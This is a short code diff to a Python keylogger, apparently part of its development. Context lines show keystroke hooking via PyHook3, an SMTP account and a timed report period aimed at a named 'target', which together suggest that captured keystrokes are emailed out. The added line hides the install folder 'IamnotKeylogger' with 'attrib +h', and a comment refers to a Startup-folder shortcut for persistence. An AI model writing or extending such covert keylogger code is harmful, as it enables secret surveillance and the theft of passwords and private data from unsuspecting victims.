@@ -8,7 +8,7 @@ from smtplib import SMTP
 from threading import Timer
 from PyHook3 import HookManager
 
-TO_EMAIL = 'youremail@gmail.com'
+TO_EMAIL = 'youemail@gmail.com'
 PS_EMAIL = 'yourpassword'
 PERIOD = 1800.0 #seconds
 TARGET_NAME = 'target 1'
@@ -23,6 +23,7 @@ user_name = getuser()
 exec_path = r'C:\Users\%s\IamnotKeylogger' %(user_name) 
 if not os.path.exists(exec_path):
     os.makedirs(exec_path)
+    os.system('attrib +h ' + exec_path)
     copy(sys.executable, exec_path)
 
 # Create the shortcut of this exec at Startup folder
